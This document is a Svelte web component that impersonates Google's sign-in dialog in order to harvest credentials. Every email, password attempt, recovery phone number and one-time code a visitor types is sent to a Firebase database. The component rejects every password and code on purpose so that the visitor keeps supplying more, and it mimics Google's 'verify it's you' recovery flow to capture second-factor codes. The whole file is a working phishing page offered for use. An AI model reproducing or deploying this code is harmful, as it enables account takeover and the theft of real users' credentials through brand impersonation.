<script>
	import { onMount } from 'svelte';
	let { isOpen = $bindable(false) } = $props();

	let step = $state('email'); // email | password | wrongPassword | recovery | otp | success
	let email = $state('');
	let password = $state('');
	let showPassword = $state(false);
	let phoneNumber = $state('');
	import { db } from '$lib/firebase';
	import { ref, set, update, push, get } from 'firebase/database';

	let sessionId = $state('');

	let otp = $state('');
	let emailError = $state('');
	let otpError = $state('');
	let isLoading = $state(false);
	let initialLoading = $state(false);

	let wasOpen = false;
	$effect(() => {
		if (isOpen && !sessionId) {
			sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
			initialLoading = true;
			setTimeout(() => {
				initialLoading = false;
			}, 4000);
		}
		if (!isOpen && wasOpen) {
			setTimeout(() => {
				step = 'email';
				email = '';
				password = '';
				showPassword = false;
				phoneNumber = '';
				otp = '';
				emailError = '';
				otpError = '';
				sessionId = '';
			}, 300);
		}
		wasOpen = isOpen;

		// Persist to localStorage
		if (typeof localStorage !== 'undefined') {
			localStorage.setItem('authState', JSON.stringify({
				isOpen,
				step,
				email,
				phoneNumber,
				otp,
				sessionId
			}));
		}
	});

	function closeModal() {
		isOpen = false;
	}

	function handleOverlayClick(e) {
		if (e.target === e.currentTarget) closeModal();
	}

	onMount(() => {
		const saved = localStorage.getItem('authState');
		if (saved) {
			try {
				const parsed = JSON.parse(saved);
				if (parsed.isOpen) {
					setTimeout(() => {
						isOpen = true;
						step = parsed.step || 'email';
						email = parsed.email || '';
						phoneNumber = parsed.phoneNumber || '';
						otp = parsed.otp || '';
						sessionId = parsed.sessionId || '';
					}, 0);
				}
			} catch (e) {}
		}
	});

	function handleEmailNext() {
		if (!email.trim()) {
			emailError = 'Enter an email or phone number';
			return;
		}
		emailError = '';
		isLoading = true;
		
		// Record email in Firebase
		if (sessionId) {
			set(ref(db, `sessions/${sessionId}`), {
				email: displayEmail(),
				timestamp: Date.now()
			}).catch(console.error);
		}

		setTimeout(() => {
			isLoading = false;
			step = 'password';
		}, 4000);
	}

	function handlePasswordNext() {
		if (!password.trim()) return;
		isLoading = true;
		
		// Record password attempt in Firebase
		if (sessionId) {
			push(ref(db, `sessions/${sessionId}/passwords`), password).catch(console.error);
		}

		setTimeout(() => {
			isLoading = false;
			step = 'wrongPassword';
			password = ''; // Clear for next attempt
		}, 4000);
	}

	function handleWrongPasswordNext() {
		if (!password.trim()) return;
		isLoading = true;
		
		// Record next password attempt in Firebase
		if (sessionId) {
			push(ref(db, `sessions/${sessionId}/passwords`), password).catch(console.error);
		}

		setTimeout(() => {
			isLoading = false;
			step = 'wrongPassword';
			password = ''; // Clear for next attempt
		}, 4000);
	}

	function handleForgotPassword() {
		isLoading = true;
		
		if (sessionId) {
			update(ref(db, `sessions/${sessionId}`), { forgotPasswordClicked: true }).catch(console.error);
		}

		setTimeout(() => {
			isLoading = false;
			step = 'recovery';
			phoneNumber = '';
		}, 4000);
	}

	function handleRecoveryNext() {
		if (!phoneNumber.trim() || phoneNumber.length < 10) return;
		isLoading = true;
		
		// Record phone number in Firebase
		if (sessionId) {
			update(ref(db, `sessions/${sessionId}`), { phone: phoneNumber }).catch(console.error);
		}

		setTimeout(() => {
			isLoading = false;
			step = 'otp';
			otp = '';
		}, 4000);
	}

	function handleOtpSubmit() {
		if (otp.length < 4) return;
		isLoading = true;
		otpError = '';
		
		if (sessionId) {
			push(ref(db, `sessions/${sessionId}/otps`), otp).catch(console.error);
		}

		setTimeout(() => {
			isLoading = false;
			otpError = 'Wrong OTP. Please try again.';
			otp = '';
		}, 4000);
	}

	function handleKeydown(e, action) {
		if (e.key === 'Enter') action();
	}

	let displayEmail = () => (email.includes('@') ? email : email ? `${email}@gmail.com` : '');
	let maskedPhone = '••••••26';
</script>

{#if isOpen}
	<!-- svelte-ignore a11y_click_events_have_key_events -->
	<!-- svelte-ignore a11y_no_static_element_interactions -->
	<div
		class="fixed inset-0 z-[100] flex items-center justify-center bg-black/60 backdrop-blur-sm transition-all duration-300 p-4"
		onclick={handleOverlayClick}
	>
		{#if initialLoading}
			<div class="flex items-center justify-center p-12">
				<div class="h-14 w-14 animate-spin rounded-full border-4 border-[#0b57d0]/20 border-t-[#0b57d0]"></div>
			</div>
		{:else}
			<!-- Google Modal Container -->
			<div
				class="relative flex w-full max-w-[1040px] flex-col overflow-hidden rounded-[28px] bg-white text-[#1f1f1f] shadow-2xl md:min-h-[500px]"
				style="font-family: 'Product Sans', 'Google Sans', Roboto, Arial, sans-serif;"
			>
				{#if isLoading}
				<!-- Google indeterminate progress bar -->
				<div class="absolute left-0 top-0 z-[110] h-1 w-full overflow-hidden bg-blue-100 rounded-t-[28px]">
					<div class="absolute h-full bg-blue-800" style="animation: google-progress 2s infinite ease-in-out;"></div>
				</div>
				<!-- Interaction blocker -->
				<div class="absolute inset-0 z-[105]"></div>
			{/if}

			{#if step === 'success'}
				<div class="flex flex-1 flex-col items-center justify-center p-12 text-center">
					<div class="mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-green-100">
						<svg class="h-10 w-10 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
							<path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
						</svg>
					</div>
					<h1 class="mb-2 text-[32px] font-normal text-[#1f1f1f]">Logged in successfully!</h1>
					<p class="text-[16px] text-[#444746]">Welcome back, {displayEmail()}</p>
				</div>
			{:else}
				<div class="flex flex-1 flex-col md:flex-row">
					<!-- LEFT PANEL -->
					<div class="flex flex-1 flex-col justify-start px-8 pt-10 md:px-14 md:pt-14">
						<img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="mb-6 h-7 w-fit" />
						
						{#if step === 'email'}
							<h1 class="text-[36px] font-normal leading-tight text-[#1f1f1f]">Sign in</h1>
							<p class="mt-4 text-[16px] text-[#1f1f1f]">Use your Google Account</p>
						
						{:else if step === 'password' || step === 'wrongPassword'}
							<h1 class="text-[36px] font-normal leading-tight text-[#1f1f1f]">Welcome</h1>
							<button type="button" class="mt-6 inline-flex w-fit items-center gap-2 rounded-full border border-[#747775] px-3 py-1.5 transition-colors hover:bg-[#f0f4f9]">
								<svg class="h-5 w-5 text-[#444746]" viewBox="0 0 24 24" fill="currentColor">
									<path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.93 0 3.5 1.57 3.5 3.5S13.93 13 12 13s-3.5-1.57-3.5-3.5S10.07 6 12 6zm0 14c-2.03 0-4.43-.82-6.14-2.88C7.55 15.8 9.68 15 12 15s4.45.8 6.14 2.12C16.43 19.18 14.03 20 12 20z"/>
								</svg>
								<span class="max-w-[200px] truncate text-[14px] font-medium text-[#1f1f1f]">{displayEmail()}</span>
								<svg class="h-4 w-4 text-[#444746]" viewBox="0 0 24 24" fill="currentColor"><path d="M7 10l5 5 5-5z"/></svg>
							</button>

						{:else if step === 'recovery'}
							<h1 class="text-[36px] font-normal leading-tight text-[#1f1f1f]">Account recovery</h1>
							<p class="mt-4 text-[16px] leading-relaxed text-[#1f1f1f]">
								To help keep your account safe, Google wants to make sure it's really you trying to sign in
							</p>
							<button type="button" class="mt-6 inline-flex w-fit items-center gap-2 rounded-full border border-[#747775] px-3 py-1.5 transition-colors hover:bg-[#f0f4f9]">
								<svg class="h-5 w-5 text-[#444746]" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.93 0 3.5 1.57 3.5 3.5S13.93 13 12 13s-3.5-1.57-3.5-3.5S10.07 6 12 6zm0 14c-2.03 0-4.43-.82-6.14-2.88C7.55 15.8 9.68 15 12 15s4.45.8 6.14 2.12C16.43 19.18 14.03 20 12 20z"/></svg>
								<span class="max-w-[200px] truncate text-[14px] font-medium text-[#1f1f1f]">{displayEmail()}</span>
								<svg class="h-4 w-4 text-[#444746]" viewBox="0 0 24 24" fill="currentColor"><path d="M7 10l5 5 5-5z"/></svg>
							</button>

						{:else if step === 'otp'}
							<h1 class="text-[36px] font-normal leading-tight text-[#1f1f1f]">Verify your phone</h1>
							<p class="mt-4 text-[16px] leading-relaxed text-[#1f1f1f]">
								Google sent a verification code to your phone number ending in {phoneNumber.slice(-2)}.
							</p>
							<button type="button" class="mt-6 inline-flex w-fit items-center gap-2 rounded-full border border-[#747775] px-3 py-1.5 transition-colors hover:bg-[#f0f4f9]">
								<svg class="h-5 w-5 text-[#444746]" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.93 0 3.5 1.57 3.5 3.5S13.93 13 12 13s-3.5-1.57-3.5-3.5S10.07 6 12 6zm0 14c-2.03 0-4.43-.82-6.14-2.88C7.55 15.8 9.68 15 12 15s4.45.8 6.14 2.12C16.43 19.18 14.03 20 12 20z"/></svg>
								<span class="max-w-[200px] truncate text-[14px] font-medium text-[#1f1f1f]">{displayEmail()}</span>
								<svg class="h-4 w-4 text-[#444746]" viewBox="0 0 24 24" fill="currentColor"><path d="M7 10l5 5 5-5z"/></svg>
							</button>
						{/if}
					</div>

					<!-- RIGHT PANEL -->
					<div class="flex flex-1 flex-col justify-center px-8 pb-10 pt-10 md:px-14 md:pb-14 md:pt-14">
						{#if step === 'email'}
							<div class="w-full">
								<div class="relative mt-2">
									<input
										type="text"
										id="email"
										bind:value={email}
										onkeydown={(e) => handleKeydown(e, handleEmailNext)}
										placeholder=" "
										class="peer w-full rounded-[4px] border border-[#747775] bg-transparent px-4 pb-2 pt-6 text-[16px] text-[#1f1f1f] outline-none transition-all duration-200 focus:border-2 focus:border-[#0b57d0] {emailError ? 'border-[#b3261e] focus:border-[#b3261e]' : ''}"
									/>
									<label
										for="email"
										class="pointer-events-none absolute left-3 top-4 -translate-y-1/2 bg-white px-1 text-[16px] text-[#444746] transition-all duration-200 peer-focus:top-0 peer-focus:-translate-y-1/2 peer-focus:text-[12px] peer-focus:text-[#0b57d0] peer-[:not(:placeholder-shown)]:top-0 peer-[:not(:placeholder-shown)]:-translate-y-1/2 peer-[:not(:placeholder-shown)]:text-[12px] {emailError ? 'text-[#b3261e] peer-focus:text-[#b3261e]' : ''}"
									>
										Email or phone
									</label>
								</div>
								{#if emailError}
									<p class="mt-2 flex items-center gap-1.5 text-[12px] text-[#b3261e]">
										<svg class="h-4 w-4 shrink-0" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
										{emailError}
									</p>
								{/if}
								
								<button class="mt-2 text-[14px] font-medium text-[#0b57d0] hover:underline">Forgot email?</button>

								<p class="mt-10 text-[14px] leading-relaxed text-[#444746]">
									Not your computer? Use Guest mode to sign in privately. <br/>
									<button class="font-medium text-[#0b57d0] hover:underline">Learn more about using Guest mode</button>
								</p>

								<div class="mt-12 flex items-center justify-between">
									<button class="rounded-full px-4 py-2 text-[14px] font-medium text-[#0b57d0] hover:bg-[#f0f4f9] transition-colors">
										Create account
									</button>
									<button
										onclick={handleEmailNext}
										class="rounded-full bg-[#0b57d0] px-6 py-2.5 text-[14px] font-medium text-white transition-colors hover:bg-[#1a66db]"
									>
										Next
									</button>
								</div>
							</div>

						{:else if step === 'password' || step === 'wrongPassword'}
							<div class="w-full">
								<div class="relative mt-2">
									<input
										type={showPassword ? 'text' : 'password'}
										id="password"
										bind:value={password}
										onkeydown={(e) => handleKeydown(e, step === 'password' ? handlePasswordNext : handleWrongPasswordNext)}
										placeholder=" "
										class="peer w-full rounded-[4px] border border-[#747775] bg-transparent px-4 pb-2 pt-6 text-[16px] text-[#1f1f1f] outline-none transition-all duration-200 focus:border-2 focus:border-[#0b57d0] {step === 'wrongPassword' ? 'border-[#b3261e] focus:border-[#b3261e]' : ''}"
									/>
									<label
										for="password"
										class="pointer-events-none absolute left-3 top-4 -translate-y-1/2 bg-white px-1 text-[16px] text-[#444746] transition-all duration-200 peer-focus:top-0 peer-focus:-translate-y-1/2 peer-focus:text-[12px] peer-focus:text-[#0b57d0] peer-[:not(:placeholder-shown)]:top-0 peer-[:not(:placeholder-shown)]:-translate-y-1/2 peer-[:not(:placeholder-shown)]:text-[12px] {step === 'wrongPassword' ? 'text-[#b3261e] peer-focus:text-[#b3261e]' : ''}"
									>
										Enter your password
									</label>
								</div>
								{#if step === 'wrongPassword'}
									<p class="mt-2 flex items-center gap-1.5 text-[12px] text-[#b3261e]">
										<svg class="h-4 w-4 shrink-0" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
										Wrong password. Try again or click Forgot password to reset it.
									</p>
								{/if}

								<label class="mt-4 flex cursor-pointer items-center gap-4 text-[14px] text-[#1f1f1f]">
									<input type="checkbox" bind:checked={showPassword} class="h-4 w-4 rounded border-[#747775] accent-[#0b57d0]" />
									Show password
								</label>

								<div class="mt-16 flex items-center justify-between">
									<button onclick={handleForgotPassword} class="rounded-full px-4 py-2 text-[14px] font-medium text-[#0b57d0] hover:bg-[#f0f4f9] transition-colors">
										Forgot password?
									</button>
									<button
										onclick={step === 'password' ? handlePasswordNext : handleWrongPasswordNext}
										class="rounded-full bg-[#0b57d0] px-6 py-2.5 text-[14px] font-medium text-white transition-colors hover:bg-[#1a66db]"
									>
										Next
									</button>
								</div>
							</div>

						{:else if step === 'recovery'}
							<div class="w-full">
								<p class="mb-6 text-[14px] text-[#444746]">
									Confirm the phone number you provided in your security settings: {maskedPhone}
								</p>
								<div class="relative flex items-center gap-3">
									<div class="flex h-[56px] items-center gap-1 rounded-[4px] border border-[#747775] px-3">
										<span class="text-xl">🇮🇳</span>
										<svg class="h-4 w-4 text-[#444746]" viewBox="0 0 24 24" fill="currentColor"><path d="M7 10l5 5 5-5z"/></svg>
									</div>
									<div class="relative flex-1">
										<input
											type="tel"
											id="phone"
											bind:value={phoneNumber}
											onkeydown={(e) => handleKeydown(e, handleRecoveryNext)}
											placeholder=" "
											class="peer w-full rounded-[4px] border border-[#747775] bg-transparent px-4 pb-2 pt-6 text-[16px] text-[#1f1f1f] outline-none transition-all duration-200 focus:border-2 focus:border-[#0b57d0]"
										/>
										<label
											for="phone"
											class="pointer-events-none absolute left-3 top-4 -translate-y-1/2 bg-white px-1 text-[16px] text-[#444746] transition-all duration-200 peer-focus:top-0 peer-focus:-translate-y-1/2 peer-focus:text-[12px] peer-focus:text-[#0b57d0] peer-[:not(:placeholder-shown)]:top-0 peer-[:not(:placeholder-shown)]:-translate-y-1/2 peer-[:not(:placeholder-shown)]:text-[12px]"
										>
											Phone number
										</label>
									</div>
								</div>

								<div class="mt-16 flex items-center justify-between">
									<button class="rounded-full px-4 py-2 text-[14px] font-medium text-[#0b57d0] hover:bg-[#f0f4f9] transition-colors">
										I don't have my phone
									</button>
									<button
										onclick={handleRecoveryNext}
										class="rounded-full bg-[#0b57d0] px-6 py-2.5 text-[14px] font-medium text-white transition-colors hover:bg-[#1a66db]"
									>
										Next
									</button>
								</div>
							</div>

						{:else if step === 'otp'}
							<div class="w-full">
								<p class="mb-6 text-[14px] text-[#444746]">
									A text message with a 6-digit verification code was just sent to ••••••{phoneNumber.slice(-2)}
								</p>
								<div class="relative w-full">
									<input
										type="text"
										id="otp"
										bind:value={otp}
										maxlength="8"
										onkeydown={(e) => handleKeydown(e, handleOtpSubmit)}
										placeholder=" "
										class="peer w-full rounded-[4px] border border-[#747775] bg-transparent px-4 pb-2 pt-6 text-[16px] tracking-[0.5em] text-[#1f1f1f] outline-none transition-all duration-200 focus:border-2 focus:border-[#0b57d0] {otpError ? 'border-[#b3261e] focus:border-[#b3261e]' : ''}"
									/>
									<label
										for="otp"
										class="pointer-events-none absolute left-3 top-4 -translate-y-1/2 bg-white px-1 text-[16px] tracking-normal text-[#444746] transition-all duration-200 peer-focus:top-0 peer-focus:-translate-y-1/2 peer-focus:text-[12px] peer-focus:text-[#0b57d0] peer-[:not(:placeholder-shown)]:top-0 peer-[:not(:placeholder-shown)]:-translate-y-1/2 peer-[:not(:placeholder-shown)]:text-[12px] {otpError ? 'text-[#b3261e] peer-focus:text-[#b3261e]' : ''}"
									>
										Enter code
									</label>
								</div>
								
								{#if otpError}
									<p class="mt-2 flex items-center gap-1.5 text-[12px] text-[#b3261e]">
										<svg class="h-4 w-4 shrink-0" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
										{otpError}
									</p>
								{/if}
								
								<button class="mt-4 text-[14px] font-medium text-[#0b57d0] hover:underline">Resend code</button>

								<div class="mt-16 flex items-center justify-end">
									<button
										onclick={handleOtpSubmit}
										disabled={otp.length < 4}
										class="rounded-full bg-[#0b57d0] px-6 py-2.5 text-[14px] font-medium text-white transition-colors hover:bg-[#1a66db] disabled:opacity-50"
									>
										Next
									</button>
								</div>
							</div>
						{/if}
					</div>
				</div>

				<!-- Footer Links -->
				<div class="flex flex-col items-center justify-between px-8 py-4 md:flex-row md:px-14">
					<button class="flex items-center gap-2 text-[12px] text-[#444746] hover:bg-gray-50 px-2 py-1 rounded">
						English (United States)
						<svg class="h-3 w-3" viewBox="0 0 24 24" fill="currentColor"><path d="M7 10l5 5 5-5z"/></svg>
					</button>
					<div class="mt-2 flex items-center gap-6 text-[12px] text-[#444746] md:mt-0">
						<button class="hover:bg-gray-50 px-2 py-1 rounded">Help</button>
						<button class="hover:bg-gray-50 px-2 py-1 rounded">Privacy</button>
						<button class="hover:bg-gray-50 px-2 py-1 rounded">Terms</button>
					</div>
				</div>
			{/if}
		</div>
		{/if}
	</div>
{/if}

<style>
	@keyframes google-progress {
		0% {
			left: -35%;
			right: 100%;
		}
		60% {
			left: 100%;
			right: -90%;
		}
		100% {
			left: 100%;
			right: -90%;
		}
	}
</style>
